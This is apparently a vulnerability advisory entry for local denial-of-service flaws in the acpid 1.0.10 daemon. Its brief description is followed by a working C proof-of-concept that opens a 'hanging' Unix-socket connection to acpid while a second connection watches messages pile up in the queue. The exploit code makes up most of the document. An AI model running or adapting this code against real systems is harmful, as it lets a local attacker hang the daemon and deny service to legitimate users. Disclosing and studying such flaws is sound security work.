source: http://www.securityfocus.com/bid/45915/info

The 'acpid' daemon is prone to multiple local denial-of-service vulnerabilities.

Successful exploits will allow attackers to cause the application to hang, denying service to legitimate users.

acpid 1.0.10 is vulnerable; other versions may also be affected.

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <errno.h>
#include <sys/un.h>
#include <fcntl.h>
#include <unistd.h>

/* Tested on acpid-1.0.10 (Ubuntu 10.04) */

int ud_connect(const char *name)
{
	int fd;
	int r;
	struct sockaddr_un addr;

	fd = socket(AF_UNIX, SOCK_STREAM, 0);
	if (fd < 0) {
		perror("socket");
		return fd;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	sprintf(addr.sun_path, "%s", name);

	r = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
	if (r < 0) {
		perror("connect");
		close(fd);
		return r;
	}

	return fd;
}

int main(int argc, char *argv[])
{
	int fd;
	char c;

	if (argc != 2) {
		fprintf(stderr, "Usage: prog fname\n");
		exit(1);
	}

	fd = ud_connect(argv[1]);
	if (fd < 0)
		exit(1);
	printf("\"Hanging\" socket opened, fd = %d\n", fd);

	fd = ud_connect(argv[1]);
	if (fd < 0)
		exit(1);
	printf("Normal socket opened, fd = %d\n", fd);

	while (1) {
		static int n;
		read(fd, &c, 1);
		fflush(stdout);
		if (c == '\n') {
			printf("%d messages in queue\n", ++n);
		}
	}
}

